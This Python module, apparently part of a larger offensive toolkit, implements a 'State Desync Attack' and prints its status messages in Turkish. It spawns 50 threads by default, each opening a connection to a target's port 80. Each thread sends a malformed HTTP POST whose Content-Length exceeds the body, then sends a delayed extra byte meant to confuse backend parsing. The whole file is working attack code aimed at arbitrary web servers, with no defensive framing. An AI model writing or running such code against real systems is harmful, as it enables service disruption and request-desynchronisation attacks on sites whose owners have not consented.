# modules/state_desync.py

import threading
import socket
import random
import time

def malformed_http_request(host):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, 80))
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 10\r\n"
            "\r\n"
            "X"
        )
        s.send(payload.encode())
        time.sleep(2)
        s.send(b"X")  # Backend bunu farklı yorumlayabilir
        s.close()
    except:
        pass

def run(target, threads=50, _=0):
    print("[*] Başlatılıyor: State Desync Attack")
    host = target.replace("http://", "").replace("https://", "").split("/")[0]
    thread_list = []

    for _ in range(threads):
        t = threading.Thread(target=malformed_http_request, args=(host,))
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()
